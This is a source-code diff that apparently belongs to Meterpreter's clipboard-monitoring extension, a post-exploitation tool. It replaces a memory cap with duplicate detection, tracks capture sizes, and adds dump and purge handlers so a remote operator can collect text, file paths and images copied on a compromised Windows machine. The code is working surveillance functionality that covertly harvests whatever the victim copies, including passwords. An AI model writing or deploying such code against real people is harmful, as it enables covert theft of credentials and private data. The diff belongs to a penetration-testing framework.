@@ -7,9 +7,6 @@
 #include "clipboard.h"
 #include "clipboard_image.h"
 
-/*! @brief the Limit on the size of the data we'll keep in memory. */
-#define MAX_CLIPBOARD_MONITOR_MEMORY (1024 * 1024 * 40)
-
 typedef enum _ClipboadrCaptureType
 {
 	CapText, CapFiles, CapImage
@@ -410,9 +407,92 @@ VOID dump_clipboard_capture_list(Packet* pResponse, ClipboardCaptureList* pCaptu
 	lock_release(pCaptureList->pClipboardCaptureLock);
 }
 
+BOOL is_duplicate(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
+{
+	ClipboardFile* pTailFiles = NULL;
+	ClipboardFile* pNewFiles = NULL;
+	BOOL bResult = FALSE;
+
+	lock_acquire(pList->pClipboardCaptureLock);
+
+	do
+	{
+		if (pList->pTail == NULL)
+		{
+			break;
+		}
+
+		if (pList->pTail->captureType != pNewCapture->captureType)
+		{
+			break;
+		}
+
+		switch (pNewCapture->captureType)
+		{
+			case CapText:
+			{
+				if (lstrcmpA(pNewCapture->lpText, pList->pTail->lpText) == 0)
+				{
+					bResult = TRUE;
+				}
+				break;
+			}
+			case CapFiles:
+			{
+				pTailFiles = pList->pTail->lpFiles;
+				pNewFiles = pNewCapture->lpFiles;
+
+				while (pTailFiles != NULL && pNewFiles != NULL)
+				{
+					if (pTailFiles->qwSize != pNewFiles->qwSize
+						|| lstrcmpA(pTailFiles->lpPath, pNewFiles->lpPath) != 0)
+					{
+						break;
+					}
+					pTailFiles = pTailFiles->pNext;
+					pNewFiles = pNewFiles->pNext;
+				}
+
+				if (pTailFiles == NULL && pNewFiles == NULL)
+				{
+					// we got to the end without an early-out, and the lists are
+					// the same size, so, they're the same!
+					bResult = TRUE;
+				}
+
+				break;
+			}
+			case CapImage:
+			{
+				if (pNewCapture->dwSize == pList->pTail->dwSize
+					 && pNewCapture->lpImage->dwHeight == pList->pTail->lpImage->dwHeight
+					 && pNewCapture->lpImage->dwWidth == pList->pTail->lpImage->dwWidth)
+				{
+					// looking quite similar. if no content given we'll assume different because
+					// there's little to no damage in recording an extra copy and paste of an image
+					// without storing the data. So only when they're both non-null will we continue.
+					if (pNewCapture->lpImage->lpImageContent != NULL
+						&& pList->pTail->lpImage->lpImageContent != NULL)
+					{
+						if (memcmp(pNewCapture->lpImage->lpImageContent, pList->pTail->lpImage->lpImageContent, pNewCapture->lpImage->dwImageSize) == 0)
+						{
+							bResult = TRUE;
+						}
+					}
+				}
+				break;
+			}
+		}
+	} while (0);
+
+	lock_release(pList->pClipboardCaptureLock);
+
+	return bResult;
+}
+
 BOOL add_clipboard_capture(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
 {
-	if (pNewCapture->dwSize + pList->dwClipboardDataSize > MAX_CLIPBOARD_MONITOR_MEMORY)
+	if (is_duplicate(pNewCapture, pList))
 	{
 		return FALSE;
 	}
@@ -483,6 +563,7 @@ DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
 					pCapture->lpText = (char*)malloc(dwCount);
 					memset(pCapture->lpText, 0, dwCount);
 					strncpy_s(pCapture->lpText, dwCount, lpClipString, dwCount - 1);
+					pCapture->dwSize = dwCount;
 
 					pGlobalUnlock(hClipboardData);
 				}
@@ -503,6 +584,9 @@ DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
 					pCapture->lpImage->dwWidth = htonl(lpBI->bmiHeader.biWidth);
 					pCapture->lpImage->dwHeight = htonl(lpBI->bmiHeader.biHeight);
 
+					// throw together a basic guess for this, it doesn't have to be exact.
+					pCapture->dwSize = lpBI->bmiHeader.biWidth * lpBI->bmiHeader.biHeight * 4;
+
 					// only download the image if they want it
 					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
 						bCaptureImageData ? "WILL" : "will NOT");
@@ -517,6 +601,7 @@ DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
 							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
 							pCapture->lpImage->lpImageContent = image.pImageBuffer;
 							pCapture->lpImage->dwImageSize = image.dwImageBufferSize;
+							pCapture->dwSize = image.dwImageBufferSize;
 
 							// Just leaving this in for debugging purposes later on
 							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -577,6 +662,7 @@ DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
 							pFile->lpPath = (char*)malloc(dwCount);
 							memset(pFile->lpPath, 0, dwCount);
 							strncpy_s(pFile->lpPath, dwCount, lpFileName, dwCount - 1);
+							pCapture->dwSize += dwCount;
 
 							memset(&largeInt, 0, sizeof(largeInt));
 
@@ -623,6 +709,7 @@ LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam
 	if (!pState)
 	{
 		pState = gClipboardState;
+		SetWindowLongPtrA(hWnd, GWLP_USERDATA, (LONG_PTR)pState);
 	}
 
 	switch (uMsg)
@@ -669,7 +756,7 @@ LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam
 				else
 				{
 					free(pNewCapture);
-					dprintf("[EXTAPI CLIPBOARD] Data size too big, ignoring data %x", hWnd);
+					dprintf("[EXTAPI CLIPBOARD] Ignoring duplicate capture", hWnd);
 				}
 			}
 			else
@@ -1060,7 +1147,7 @@ DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
 		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
 		dprintf("[EXTAPI CLIPBOARD] Class Name set to %s", pState->cbWindowClass);
 
-		pState->bCaptureImageData = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
+		pState->bCaptureImageData = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);
 
 		pState->hPauseEvent = event_create();
 		pState->hResumeEvent = event_create();
@@ -1196,7 +1283,7 @@ DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
 
 		dprintf("[EXTAPI CLIPBOARD] Stopping clipboard monitor");
 		bDump = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DUMP);
-		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
+		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);
 
 		// now stop the show
 		event_signal(gClipboardState->hThread->sigterm);
@@ -1241,10 +1328,49 @@ DWORD request_clipboard_monitor_dump(Remote *remote, Packet *packet)
 		{
 			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
 		}
-		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAPTURE_IMG_DATA);
+		bIncludeImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA);
 		bPurge = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_PURGE);
 
+		dprintf("[EXTAPI CLIPBOARD] Purging? %s", bPurge ? "TRUE" : "FALSE");
+
 		dump_clipboard_capture_list(pResponse, &gClipboardState->captureList, bIncludeImages, bPurge);
+
+		if (bPurge)
+		{
+			lock_acquire(gClipboardState->captureList.pClipboardCaptureLock);
+			destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
+			lock_release(gClipboardState->captureList.pClipboardCaptureLock);
+		}
+
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	packet_transmit_response(dwResult, remote, pResponse);
+
+	return dwResult;
+#else
+	return ERROR_NOT_SUPPORTED;
+#endif
+}
+
+DWORD request_clipboard_monitor_purge(Remote *remote, Packet *packet)
+{
+#ifdef _WIN32
+	DWORD dwResult = ERROR_SUCCESS;
+	BOOL bIncludeImages = TRUE;
+	BOOL bPurge = TRUE;
+	Packet *pResponse = packet_create_response(packet);
+
+	do
+	{
+		if (gClipboardState == NULL)
+		{
+			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOT_CAPABLE);
+		}
+
+		lock_acquire(gClipboardState->captureList.pClipboardCaptureLock);
+		destroy_clipboard_monitor_capture(&gClipboardState->captureList, FALSE);
+		lock_release(gClipboardState->captureList.pClipboardCaptureLock);
 
 		dwResult = ERROR_SUCCESS;
 	} while (0);
